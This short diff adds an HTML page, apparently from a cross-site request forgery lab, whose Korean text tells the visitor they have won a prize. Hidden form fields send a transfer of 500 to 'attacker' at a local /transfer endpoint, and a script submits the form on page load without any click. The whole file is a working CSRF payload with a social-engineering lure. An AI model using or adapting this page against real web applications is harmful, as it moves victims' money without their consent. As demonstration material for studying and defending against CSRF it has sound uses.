@@ -1,0 +1,14 @@
+<!-- attacker.html -->
+<html>
+<body>
+<h1>축하합니다! 경품에 당첨되었습니다!</h1>
+<p>아래 버튼을 클릭하여 경품을 수령하세요.</p>
+
+<!-- 숨겨진 자동 송금 폼 -->
+<form action="http://localhost:5001/transfer" method="POST">
+    <input type="hidden" name="to" value="attacker">
+    <input type="hidden" name="amount" value="500">
+</form>
+<script>document.forms[0].submit();</script>
+</body>
+</html>
